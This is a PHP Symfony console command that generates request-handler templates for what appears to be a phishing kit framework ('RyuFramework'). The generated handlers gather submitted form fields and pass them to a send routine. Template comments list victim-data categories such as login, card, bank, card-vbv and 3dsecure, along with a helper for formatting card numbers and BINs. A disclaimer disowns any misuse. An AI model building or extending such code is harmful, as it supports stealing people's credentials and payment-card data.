<?php

namespace Dev\Command;


use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\Style\SymfonyStyle;
use Symfony\Component\Console\Input\InputArgument;

class MakeRequest extends Command
{
    // the name of the command (the part after "bin/console")
    protected static $defaultName = 'make:request';
    protected static $defaultDescription = 'Generate template of request files';
    protected function configure(): void
    {
        $this->addArgument('RequestName', InputArgument::REQUIRED, 'Input request name is required');
        $this->addOption('use-html', null, InputOption::VALUE_OPTIONAL, 'This for automated detection html template form in core directories');
        $this->addOption('api',true,InputOption::VALUE_OPTIONAL, 'This for generate requested API');
        $this->addOption('use-inputs',null,InputOption::VALUE_OPTIONAL,'This for generate Inputs formatter ');
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $io = new SymfonyStyle($input, $output);

        $name = $input->getArgument('RequestName');
        $html = $input->getOption('use-html');
        $api  = $input->getOption('api');
        $inputss = $input->getOption('use-inputs');
        if ($html == null) {
            $io->writeln([
                '<comment># Separate by comma</>',
                '<comment># Example : username,password</>',
                '',
            ]);
            $form = $io->ask('FORM INPUT NAME LIST');
            $varr = $io->ask('VARIABLE NAME LIST');
            if ($this->requestTemplate($name, $form, $varr,$api , $inputss)) {
                $io->writeln('<info>Successfully generate request template</info>');
            } else {
                $io->writeln('<error>Failed to generate request template</error>');
            }
        } else {
            if ($this->requestTemplateHtml($name,$html,$api , $inputss)) {
                $io->writeln('<info>Successfully generate request template</info>');
            } else {
                $io->writeln('<error>Failed to generate request template</error>');
            }
        }

        return Command::SUCCESS;
    }
    protected function requestTemplate($name,$form,$varr,$api,$inputs)
    {
        $forms = explode(",", $form);
        $varrs = explode(",", $varr);

        $template = "<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( " . date('D,d-m-Y H:i') . " )
* @filename " . $name . ".php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v3.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/


";
        $template .= "

if(\$this->getPost())
{
    \$data = [];
";
if($inputs){
    $template.= "    \$data = inputs([\n\n";
    $n=0;
    foreach($varrs as $var)
    {
        $str = "'".$var."'";
        $val = "'".$forms[$n]."',";;
        $template.= "          ".str_pad($str , 15, ' ');
        $template.= "=>";
        $template.= "  ".$val;
        $template.="\n";
        $n++;
    }
    $template.= "  \n\n]);\n";

        $template.= "
        extract(\$data);

        \$initialize = [
        
            'continue'    => \$this->router('".$name."')['short'],

            /** 
             * @var \$type_log
             * Ex : login ,card , pap , bank ,email_login , card-vbv , access 
             * **/
            'type_log'    => '',
            
            /** 
             * @var \$desc_log 
             * can use : format_desc_log('to do text', \$data) 
             * **/
            'desc_log'    => format_desc_log('doing something',\$data),

            /**
             * @var \$type_send
             * Ex : account,card,photo,bank,email,card-vbv,3dsecure 
             * **/
            'type_send'    => '',
            
            /**
             * @var \$subject_send
             * Can use : format_subject_card(\$num,\$bin) 
             **/
            'subject_send' => 'YOUR SUBJECT  ' .strtoupper(\$email),
            
            /**
             * @var \$from_send
             * can use : format_from()
             **/
            'from_send' => format_from()
           ];
   
          extract(\$initialize);
   
        ";
}else{
        $n = 0;
        foreach ($varrs as $var) {
            $template .= "
    \$" . $var . " = \$this->input('" . $forms[$n] . "');
    \$data['" . $var . "'] = \$" . $var . "; \n
    ";
            $n++;
        }

        $template .= "
        
        /*** LOG CONFIG FOR STATS ***/
        \$continue   = \$this->router('" . $name . "')['short'];
        \$type_log   = \"\";  /** Ex : login ,card , pap , bank ,email_login , card-vbv , access **/
        \$desc_log   = \"\"; /** can use : format_desc_log('to do text', \$data) **/
        ////////////////////////////

        /**** SENDING CONFIG ***/
        \$type_send    = \"\"; /** Ex : account,card,photo,bank,email,card-vbv,3dsecure **/
        \$subject_send = \"\"; /** Can use : format_subject_card(\$num,\$bin) **/
        \$from_send    = format_from();
        ////////////////////////
        
        ";
    }
        $template .= "

       


        \$send = [
                'from'    => \$from_send,
                'subject' => \$subject_send,
                'type'    => \$type_send,
                'data'    => \$data
                ];

        \$log = [
                'type'   => \$type_log,
                'desc'   => \$desc_log
                ]; 

";
if($api){
    $template.="
    \$send_status = \$this->send(\$send,\$log);
    \$data['send_status'] = \$send_status;
    return json_response(1,\$data,'$name');
}
    ";
    file_put_contents('app/api/'.$name.'.api.php' , $template);

}else{
    $template.="
    return \$this->send(\$send,\$log,\$continue);
}
    ";
    file_put_contents('app/request/'.$name.'.php' , $template);

}
return true;
    }
    protected function requestTemplateHtml($name,$htmlName,$api , $inputs)
    {
        $htmlPath = 'core/html/'.$htmlName.'.html';
        if(file_exists($htmlPath))
        {
            $file = file_get_contents($htmlPath);
            preg_match_all("/\{(.*)\}/" , $file,$matches);
            $names = $matches[1];
            $names = array_diff($names , ['app_name' , 'ip','agent','browser','device','date']);

            $this->requestTemplate($name,implode(",",$names),implode(",",$names) , $api , $inputs);
        }
        return true;
    }
    
}
